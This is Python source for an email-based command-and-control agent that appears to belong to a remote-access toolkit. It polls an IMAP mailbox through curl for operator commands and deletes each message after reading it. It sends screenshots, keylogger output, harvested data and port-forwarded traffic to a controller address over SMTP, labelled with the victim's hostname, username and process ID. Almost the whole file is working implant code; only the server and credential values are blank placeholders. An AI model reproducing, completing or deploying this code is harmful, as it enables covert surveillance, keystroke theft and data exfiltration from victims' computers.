import os
import sys
import base64
import http.client
import json
import getpass
import ssl
import time
import subprocess
from pathlib import Path
import socket
import random

import queue

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

import threading

from localAgent import LocalAgent

class SimpleEmail:
	def __init__(self, sender, subject, body):
		self.sender = sender
		self.subject = subject
		self.body = body        

class EMailAgent(LocalAgent):
	OUTGOING_EMAIL_TMP_FILENAME = "tmp.txt";
	EMAIL_OUTGOING_URL = "FILL ME";
	IMAP_EMAIL_URL = "FILL ME";
	EMAIL_OUTGOING_USERNAME = "FILL ME";
	EMAIL_OUTGOING_PASSWORD = "FILL ME";
	EMAIL_CMD_ADDR = "FILL ME";

	EMAIL_PROTOCOL_TAG = "SMTP";

	SCREENSHOT_EMAIL_TAG = "Screenshot: ";
	KEYLOGGER_EMAIL_TAG = "Keylogger: ";
	PORTFORWARD_EMAIL_TAG = "PortForward: "
	HARVEST_EMAIL_TAG = "HARVEST";
	PROTOCOL_TAG = "PROTOCOL";
	USERNAME_TAG = "USERNAME";
	HOSTNAME_TAG = "HOSTNAME";
	PID_TAG = "PID";

	hostname = socket.gethostname()
	pid = os.getpid()
	username = getpass.getuser()

	q = queue.Queue()
	forwardQueues = {}
    
	curlLock = threading.Lock()

	def __init__(self):
		LocalAgent.__init__(self)

	def pushForward(self, forwardID, data):
		if not forwardID in self.forwardQueues:
			self.forwardQueues[forwardID] = queue.Queue()
		im_b64 = base64.b64encode(data).decode('ascii')
		subject = self.PORTFORWARD_EMAIL_TAG + forwardID + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, im_b64);

	def processNextEmail(self):
		try:
			self.curlLock.acquire()
			email = self.getNextEmail()
			self.curlLock.release()
			if(email.subject.startswith(self.PORTFORWARD_EMAIL_TAG)):
				elements = email.subject.split(" ")
				forwardID = elements[1]
				self.forwardQueues[forwardID].put(email.body)
			else:
				self.q.put(email.body)
			return "Found"
		except Exception as e:
			print("Oops, something went wrong in processNextEmail: {}".format(e), file=sys.stderr)
			print("Releasing");            
			self.curlLock.release()
			return "No email"

	def pollForward(self, forwardID):
		if not forwardID in self.forwardQueues:
			self.forwardQueues[forwardID] = queue.Queue()
		if self.forwardQueues[forwardID].empty():
			self.processNextEmail()
		if self.forwardQueues[forwardID].empty():
			return None
		else:
			b64Forward = self.forwardQueues[forwardID].get()
			print(b64Forward)
			return base64.decodebytes(b64Forward.encode('ascii'))    

	def buildEmailSubject(self, hostname, username, pid, protocol):
		return self.HOSTNAME_TAG + ":" + hostname + " " + self.USERNAME_TAG + ":" + username + " " +self.PROTOCOL_TAG + ":" +protocol + " " + self.PID_TAG + ":" + str(pid);
	
	def sendEmail(self, subject, body):
		#body = body.replace("\r", "")
		self.curlLock.acquire()
		f = open(self.OUTGOING_EMAIL_TMP_FILENAME, "w", newline='')
		f.write("From: \"" + self.EMAIL_OUTGOING_USERNAME + "\" <" + self.EMAIL_OUTGOING_USERNAME + ">" + "\n")
		f.write("To: \"" + self.EMAIL_CMD_ADDR + "\" <" + self.EMAIL_CMD_ADDR + ">" + "\n")
		f.write("Subject: " + subject + "\n\n")
		f.write(body)    
		f.close()
		sendEmailCommand = "curl --url " + self.EMAIL_OUTGOING_URL + " --user " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --mail-from " + self.EMAIL_OUTGOING_USERNAME + " --mail-rcpt " + self.EMAIL_CMD_ADDR + " --upload-file " + self.OUTGOING_EMAIL_TMP_FILENAME
		sendEmailResponse = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
		self.curlLock.release()

	def postResponse(self, cmd_output):
		self.sendEmail(self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG), cmd_output);
        
	def postScreenshot(self, cmd_output):
		subject = self.SCREENSHOT_EMAIL_TAG + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, cmd_output);
			
	def postHarvest(self, cmd_output, harvestType):
		subject = self.HARVEST_EMAIL_TAG + ":" + harvestType + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
		self.sendEmail(subject, cmd_output);
	
	def getNextEmail(self):
		grabMeta = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
		cmd_output = subprocess.Popen(grabMeta, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
		if not cmd_output:
			raise
	
		sender = ""
		subject = ""
		FROM = "From: ";
		SUBJECT = "Subject: ";
		found = False;
		for line in cmd_output.splitlines():
			if line.startswith(FROM):
				sender = line[len(FROM):]
				found = True
			elif line.startswith(SUBJECT):
				subject = line[len(SUBJECT):];            
		if not found:
			raise
    
		#Get Body
		getFirstEmailBodyCmd =  "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1/;SECTION=TEXT -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD
		body = subprocess.Popen(getFirstEmailBodyCmd, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
		if (body[len(body) - 1] == '\n'):
			body = body[0: len(body) - 1];
		if (body[len(body) - 1] == '\r'):
			body = body[0: len(body) - 1];

		delCmdOne = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"STORE 1 +Flags \\Deleted\""
	
		#To delete, two step process:
		delCmdOneResponse = subprocess.Popen(delCmdOne, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
	
		delCmdTwo = "curl " + self.IMAP_EMAIL_URL + "/inbox;UID=1 -u " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " -X \"EXPUNGE\""
		delCmdTwoResponse = subprocess.Popen(delCmdTwo, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
	
		return SimpleEmail(sender, subject, body);    
    
	def pollServer(self):
		"""
		try:
			email = self.getNextEmail()
			return email.body
		except Exception as e:
			return "<control> No Command"  
		"""
		if self.q.empty():
			print("Processing next email")
			self.processNextEmail()
		if self.q.empty():
			return "<control> No Command"
		else:
			return self.q.get()
		

	def postKeylogger(self, log):
		subject = "Keylogger: " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG)
		self.sendEmail(subject, log);

try:
	agent = EMailAgent()
	agent.postResponse("Daemon alive")
	agent.run(True)
except Exception as e:
	print("Oops, something went wrong: {}".format(e), file=sys.stderr)    